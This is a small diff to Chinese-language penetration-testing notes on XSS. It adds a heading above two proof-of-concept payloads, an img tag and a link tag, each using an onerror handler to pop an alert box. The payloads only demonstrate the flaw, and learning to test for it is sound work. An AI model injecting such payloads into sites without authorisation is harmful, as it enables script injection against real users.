@@ -1,3 +1,4 @@
+渗透测试攻击方式-xss攻击
 #dom加载时会跳出弹框的结构
 攻击方式a：<img src="x" onerror="alert(250)">
 攻击方式b：<link rel="stylesheet" href="x.css" onerror="alert(250)">
